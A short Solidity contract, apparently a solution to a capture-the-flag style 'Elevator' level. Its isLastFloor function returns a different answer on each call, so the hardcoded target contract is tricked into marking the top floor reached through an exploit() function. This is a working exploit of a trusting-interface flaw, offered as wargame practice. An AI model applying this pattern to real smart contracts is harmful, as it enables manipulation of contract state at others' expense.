// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IElevator{
    function goTo(uint256 _floor) external;
}

contract Building {
    bool x=true;
    address target = 0x844E29aFB74dFF2cd4CBa077FDe4770300702D76;
    IElevator elevator;

    function isLastFloor(uint) external returns (bool){
        x=!x;
        return x;
    }

    function exploit() public{
        elevator= IElevator(target);
        elevator.goTo(2);
    }
}
